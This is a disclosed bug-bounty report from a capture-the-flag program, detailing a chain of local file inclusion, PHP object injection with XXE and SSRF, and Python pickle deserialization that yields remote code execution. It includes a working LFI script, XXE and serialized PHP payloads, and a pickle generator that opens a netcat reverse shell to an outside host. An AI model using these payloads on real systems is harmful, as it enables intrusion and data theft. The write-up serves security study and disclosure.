# Remote Command Execution in a internal server to get the flag file

## Report Details
- **Report ID**: 415682
- **URL**: https://hackerone.com/reports/415682
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-09-28T14:52:45.388Z
- **Disclosed**: 2018-10-22T17:13:10.696Z

## Reporter
- **Username**: manoelt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-5411-ctf

## Vulnerability Information
**Summary:**
After source code disclosure using a LFI vulnerability and using PHP object injection with XXE I was able to find an internal service at port 1337. Using the SSRF through XXE I sent a HTTP request to this internal service and discovered a python object injection using status parameter, with this vector I was able to get RCE on the server located at 104.248.121.85.

**Description:**

_LFI_
The *template* parameter at /api/generate.php is vulnerable to LFI. So I could get all relevant source code from the application using *type* as text. I created a python script to help:

```
import requests
import sys

url = 'http://h1-5411.h1ctf.com/api/'
endpoint = 'generate.php'

headers = {'Cookie':'PHPSESSID=v6a28uv6ad2e9ivr02hajqao4g'}
payload = {'template' : '../../../../../../..'+sys.argv[1], 'type' : 'text', 'top-text' : '.', 'bottom-text' :'.'}

r = requests.post(url+endpoint, headers=headers, data=payload)
json_response = r.json()

file_url = json_response['meme_path']
print file_url

r = requests.get(url+file_url)
print r.text
```

Using Burp:
{F352386}

Some files read during my tests:
1. /etc/passwd
2. /etc/issue
3. /etc/resolv.conf
4. /etc/hosts
5. /var/log/apt/history.log
6. App source code

_PHP Object Injection - Deserialization and XXE_
After read the code I discovered two endpoints for a future version, 2.0:

File: header.php
```
<?php
  $pages = [
    "generate.php" => "Meme Generator",
    "memes.php" => "Your Memes",
    // for version 2.0
    // "import_memes_2.0.php" => "Import Memes",
    // "export_memes_2.0.php" => "Export Memes"
  ];
?>
```

Looking into import_memes_2.0.php and export_memes_2.0.php I found an unserialization call using user input without validation, which is extremely dangerous. So I craft a payload serializing a *ConfigFile* object with XML in *config_raw* attribute, as __toString() method calls parse() witch then calls loadXML with libxml_disable_entity_loader ENABLED. So, we could obtain XXE and SSRF.

Using PHP to create the payload:
```
<?php
require_once('classes.php'); // Same I got using LFI

$t = new ConfigFile('http://localhost/h1-5411/xml2'); 
$x = new Maintenance();

$o = [$t, $x ];

echo base64_encode(serialize($o));
```

PHP Object example (b64 decoded):
```
a:2:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:276:"<?xml version='1.0' encoding='ISO-8859-1'?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/issue' >]>
<memes><toptext>&xxe;</toptext><bottomtext>A</bottomtext><template>TeMPLaTe123</template><type>XML</type></memes>
";}i:1;O:11:"Maintenance":0:{}}
```

File: xml2
```
<?xml version='1.0' encoding='ISO-8859-1'?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/issue' >]>
<memes><toptext>&xxe;</toptext><bottomtext>A</bottomtext><template>TeMPLaTe123</template><type>XML</type></memes>
```

Then using the serialized object above (ConfigFile), I uploaded my memepak using /import_memes_2.0.php and got the /etc/issue file base64 encoded as one of my memes.


__SSRF__

Using the above XXE we could manipulate the server to do requests for others internal services, as noted at source code there is a Maintenance service somewhere.

Using the python exploit attached {F352404}, I could read files and do http/ftp requests. Although I could do a port scan using http/ftp/sftp requests, I was able to find the internal service using a process ID scan using /proc/{ID}/cmdline, which revealed:

```
/proc
1
ps-run

4
/bin/bash/opt/run/ctf-entrypoint

6
ssh-i/app/92df63a566f599a094153febb133b99f87a161b5-oStrictHostKeyChecking=no-f-N-L1337:localhost:1337maintenance@104.248.121.85

8
/bin/sh/usr/sbin/apache2ctl-DFOREGROUND
```

So I found a ssh tunnel to another service at 104.248.121.85. Using the python script above, I started to interact with http://localhost:1337/ :
 {F352398}

__Python Object Injection - Pickle__

Using the *debug* parameter I realized that *status* parameter should be base64 encoded. After that I could see a pickle base64 encoded as status. My first try was to request a status-update using a malicious pickle as status:

Creating a malicious pickle with a reverse shell:
```
import cPickle
import os
import sys
import base64

DEFAULT_COMMAND = "nc ███████ 9300 -e /bin/bash"

COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        return (os.system,(COMMAND,))

print base64.b64encode(cPickle.dumps(PickleRce()))

```
Sending the above Pickle I got a connect back from the server.

{F352400}

## Steps To Reproduce:

I created some python scripts to reproduce.

  1. Use {F352403} to read files from the server (LFI)
  2. Use {F352404} to read files and do requests to internal services. Found http://localhost:1337
  3. Use {F352406} to create a pickle payload for any OS command. With this payload, use {F352404} to send a request to http://localhost:1337/update-status?debug=1&status={PAYLOAD}

## Impact

Compromise data and servers.

## Attachments
- LFI.JPG
- Pickle.JPG
- ReverseShell.JPG
- lfi.py
- send_meme.py
- python_pickle_rce.py
